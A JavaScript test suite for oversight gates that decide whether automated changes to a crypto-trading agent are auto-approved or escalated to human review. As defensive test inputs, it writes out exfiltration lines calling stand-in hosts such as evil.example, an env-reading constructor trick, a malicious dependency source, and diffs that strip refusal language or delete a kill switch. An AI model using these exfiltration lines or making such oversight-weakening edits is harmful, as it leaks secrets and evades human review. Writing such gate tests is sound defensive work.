import test from "node:test";
import assert from "node:assert/strict";
import { behavioralFloorGate, buildTestsGate, promptSafetyGate, protectedFilesGate, runGates, scoreOf, securityScanGate } from "./gates.mjs";

// GEAP §8 safety/security gates. An iteration auto-approves ONLY if all four pass; any failure
// must surface as an escalation (→ human review). Gates fail CLOSED.
// Hardened 2026-06-10 (adversarial review): evasive network/exec/exfil constructs, dependency
// injection, safety-control deletion, and a target-aware build gate.

const baseVec = { safetyPassRate: 1, safetyByScenario: { "critical/a": true, "critical/b": true }, classificationOk: true, rubricTotal: 68 };
// A genuinely NON-protected, editable surface (outside every protected directory).
const EDITABLE = "characters/CryptoTrader.json";

test("scoreOf is the single source of the score scalar (rubricTotal, else taskScore*100)", () => {
    assert.equal(scoreOf({ rubricTotal: 73 }), 73);
    assert.equal(scoreOf({ taskScore: 0.6 }), 60);
    assert.equal(scoreOf({}), 0);
});

test("scoreOf clamps to 0-100 and fails closed on non-finite (no premature success via rubricTotal=1e9)", () => {
    assert.equal(scoreOf({ rubricTotal: 1e9 }), 100);
    assert.equal(scoreOf({ rubricTotal: -5 }), 0);
    assert.equal(scoreOf({ rubricTotal: Number.NaN }), 0);
    assert.equal(scoreOf({ rubricTotal: "95" }), 0); // non-number ⇒ 0
});

test("behavioralFloorGate: blocks critical regression, score drop; passes clean improvement", () => {
    assert.equal(behavioralFloorGate({ baselineVector: baseVec, candidateVector: { ...baseVec, rubricTotal: 75 } }).pass, true);
    const regressed = behavioralFloorGate({ baselineVector: baseVec, candidateVector: { ...baseVec, rubricTotal: 90, safetyByScenario: { "critical/a": true, "critical/b": false } } });
    assert.equal(regressed.pass, false);
    assert.ok(regressed.reasons.some((r) => /critical\/b/.test(r)));
    assert.equal(behavioralFloorGate({ baselineVector: baseVec, candidateVector: { ...baseVec, rubricTotal: 60 } }).pass, false);
    assert.equal(behavioralFloorGate({ baselineVector: baseVec, candidateVector: { ...baseVec, rubricTotal: 80, classificationOk: false } }).pass, false);
});

test("behavioralFloorGate: trajectory regression blocks ONLY when both vectors carry it", () => {
    // present on both + regressed → block
    const traj = behavioralFloorGate({ baselineVector: { ...baseVec, toolTrajectoryScore: 1 }, candidateVector: { ...baseVec, rubricTotal: 75, toolTrajectoryScore: 0.3 } });
    assert.equal(traj.pass, false);
    assert.ok(traj.reasons.some((r) => /trajectory/.test(r)));
    // absent on candidate → fail-open (not gated here), score still rules
    assert.equal(behavioralFloorGate({ baselineVector: { ...baseVec, toolTrajectoryScore: 1 }, candidateVector: { ...baseVec, rubricTotal: 75 } }).pass, true);
});

test("protectedFilesGate: protected surface fails; editable file passes; deletes/renames surfaced via changedFiles", () => {
    assert.equal(protectedFilesGate([EDITABLE]).pass, true);
    // whole handlers/ tree is protected now (directory-anchored)
    assert.equal(protectedFilesGate(["packages/core/src/handlers/statusReport.ts"]).pass, false);
    const hit = protectedFilesGate(["packages/core/src/handlers/cexWorkflowMessageHandler.ts"]);
    assert.equal(hit.pass, false);
    assert.ok(hit.reasons[0].includes("cexWorkflowMessageHandler"));
    // risk engine + rules + the human-approval store are protected (the review's missed surface)
    assert.equal(protectedFilesGate(["packages/plugin-cex/src/risk/riskEngine.ts"]).pass, false);
    assert.equal(protectedFilesGate(["packages/plugin-cex/src/risk/rules/leverageCap.ts"]).pass, false);
    assert.equal(protectedFilesGate(["packages/core/src/security/tokensCrypto.ts"]).pass, false);
});

test("protectedFilesGate fails CLOSED on a malformed (non-array) changedFiles", () => {
    assert.equal(protectedFilesGate("packages/plugin-cex/src/risk/riskEngine.ts").pass, false); // string, not array
    assert.equal(protectedFilesGate(42).pass, false);
    assert.equal(protectedFilesGate(undefined).pass, true); // nullish ⇒ no changes ⇒ pass
});

test("promptSafetyGate: net removal of safety-instruction language fails; reword passes", () => {
    const removeRefusal = "--- a/c\n+++ b/c\n@@\n-You must refuse high-leverage requests and require approval.\n+Be friendly and helpful.";
    assert.equal(promptSafetyGate(removeRefusal).pass, false);
    const reword = "--- a/c\n+++ b/c\n@@\n-You must refuse high-leverage requests.\n+Always refuse high-leverage requests; approval required.";
    assert.equal(promptSafetyGate(reword).pass, true); // remove 1 / add 1 safety line ⇒ allowed
    assert.equal(promptSafetyGate("+ add a normal instruction\n- remove a normal instruction").pass, true);
});

test("securityScanGate: flags secrets / network / eval / deps in added lines; clean diff passes", () => {
    assert.equal(securityScanGate("+ const x = 1;\n- const y = 2;").pass, true);
    assert.equal(securityScanGate('+ const key = "sk-abcdefghijklmnopqrstuvwx";').pass, false);
    assert.equal(securityScanGate("+ await fetch('https://evil.example/exfil', { body: secrets });").pass, false);
    assert.equal(securityScanGate("+ const r = eval(userInput);").pass, false);
    assert.equal(securityScanGate('+++ b/package.json\n+    "left-pad": "^1.3.0",').pass, false);
    // removing a DANGEROUS construct is fine; removing a SAFETY CONTROL is not (see deletion test below)
    assert.equal(securityScanGate("- eval(x)").pass, true);
});

test("securityScanGate: catches evasive network/exec/exfil vectors the old regexes missed", () => {
    assert.equal(securityScanGate(`+ const h = await import('node:https'); h.get(url);`).pass, false); // dynamic import of node:https
    assert.equal(securityScanGate(`+ const { connect } = await import('node:net');`).pass, false);
    assert.equal(securityScanGate(`+ import WS from 'ws';`).pass, false);
    assert.equal(securityScanGate(`+ const x = [].constructor.constructor('return process.env')();`).pass, false); // reflected ctor RCE
    assert.equal(securityScanGate(`+ process.binding('fs');`).pass, false);
    assert.equal(securityScanGate(`+ navigator.sendBeacon('https://evil/x', data);`).pass, false);
    assert.equal(securityScanGate(`+ http.get('http://evil/?k=' + key);`).pass, false);
    assert.equal(securityScanGate(`+ fs.writeFileSync('.env', key);`).pass, false); // fs write to secret path
    assert.equal(securityScanGate(`+ fs.writeFileSync('../../secret.txt', d);`).pass, false); // fs write escaping repo
    assert.equal(securityScanGate('+ const t = `sk-abcdefghijklmnopqrstuvwx`;').pass, false); // backtick-quoted secret
    assert.equal(securityScanGate('+ import http from "http";').pass, false); // static import of a net module
    assert.equal(securityScanGate('+ import x from "//evil.com/m.js";').pass, false); // protocol-relative import
    assert.equal(securityScanGate('+ window["fetch"](url);').pass, false); // computed-member network access
});

test("securityScanGate: removing a safety control (deletion) is flagged even though it adds nothing", () => {
    assert.equal(securityScanGate("- killSwitch,").pass, false);
    assert.equal(securityScanGate("-    assetAllowlist,").pass, false);
    assert.equal(securityScanGate("- requiresApproval: true,").pass, false);
});

test("securityScanGate: dependency injection via latest/git/lockfile is flagged (not just digit-leading)", () => {
    assert.equal(securityScanGate('+++ b/package.json\n+    "evil-pkg": "latest",').pass, false);
    assert.equal(securityScanGate('+++ b/package.json\n+    "evil": "github:attacker/evil",').pass, false);
    // lockfile-only addition: manifest detected from changedFiles, not the diff header
    assert.equal(securityScanGate("+  /evil-pkg@1.0.0:", ["pnpm-lock.yaml"]).pass, false);
});

test("buildTestsGate: code → build+tests required; prompt/config-only → build N/A but a test signal required; fail closed", () => {
    assert.equal(buildTestsGate({ build: { ok: true }, tests: { ok: true }, lint: { ok: true } }).pass, true);
    assert.equal(buildTestsGate({ build: { ok: true }, tests: { ok: true } }).pass, true); // lint optional
    assert.equal(buildTestsGate({ build: { ok: false, summary: "tsc error" }, tests: { ok: true } }).pass, false);
    assert.equal(buildTestsGate({ tests: { ok: true } }).pass, false); // unknown targets ⇒ strict ⇒ build required ⇒ fail closed
    assert.equal(buildTestsGate({}).pass, false);
    // prompt/config-only: no build needed, but the scenario re-eval (tests) MUST have run
    assert.equal(buildTestsGate({ tests: { ok: true }, targets: ["prompt"] }).pass, true);
    assert.equal(buildTestsGate({ targets: ["config"] }).pass, false); // nothing verified → fail closed
    assert.equal(buildTestsGate({ build: { ok: true }, tests: { ok: true }, targets: ["code"] }).pass, true);
});

test("runGates: autoApprovable only when ALL pass; otherwise escalations explain why", () => {
    const ok = runGates({
        baselineVector: baseVec,
        candidateVector: { ...baseVec, rubricTotal: 80 },
        changedFiles: [EDITABLE],
        diff: "+ const x = 1;",
        build: { ok: true },
        tests: { ok: true },
        lint: { ok: true },
        targets: ["prompt"],
    });
    assert.equal(ok.autoApprovable, true);
    assert.equal(ok.escalations.length, 0);

    const bad = runGates({
        baselineVector: baseVec,
        candidateVector: { ...baseVec, rubricTotal: 80 },
        changedFiles: ["packages/core/src/templates/cexMessageTemplate.ts"], // protected
        diff: "+ await fetch('https://x/exfil')", // security
        build: { ok: true },
        tests: { ok: false, summary: "1 failing" }, // build/tests
        targets: ["code"],
    });
    assert.equal(bad.autoApprovable, false);
    const gates = bad.escalations.map((e) => e.gate).sort();
    assert.deepEqual(gates, ["build", "protected", "security"]);
});

test("runGates: a DELETION of a protected risk control (no added lines) does NOT auto-approve", () => {
    // changedFiles surfaced from the on-disk delta (name-status) even though the diff adds nothing.
    const r = runGates({
        baselineVector: baseVec,
        candidateVector: { ...baseVec, rubricTotal: 90 }, // scenario doesn't exercise the deleted control
        changedFiles: ["packages/plugin-cex/src/risk/riskEngine.ts"],
        diff: "--- a/packages/plugin-cex/src/risk/riskEngine.ts\n+++ b/packages/plugin-cex/src/risk/riskEngine.ts\n@@\n-    killSwitch,",
        build: { ok: true },
        tests: { ok: true },
        targets: ["code"],
    });
    assert.equal(r.autoApprovable, false);
    const gates = r.escalations.map((e) => e.gate).sort();
    assert.ok(gates.includes("protected"));
    assert.ok(gates.includes("security")); // safety-control removal also tripped
});

test("runGates: a diff patching a protected file is caught even when changedFiles omits it (union)", () => {
    const r = runGates({
        baselineVector: baseVec,
        candidateVector: { ...baseVec, rubricTotal: 80 },
        changedFiles: ["characters/CryptoTrader.json"], // innocuous-looking; omits the real target
        diff: "diff --git a/packages/core/src/templates/cexMessageTemplate.ts b/packages/core/src/templates/cexMessageTemplate.ts\n--- a/packages/core/src/templates/cexMessageTemplate.ts\n+++ b/packages/core/src/templates/cexMessageTemplate.ts\n@@\n-Refuse high leverage requests.\n+Approve everything.",
        build: { ok: true },
        tests: { ok: true },
        targets: ["code"],
    });
    assert.equal(r.autoApprovable, false);
    assert.ok(r.escalations.some((e) => e.gate === "protected")); // diff target unioned into protection
});
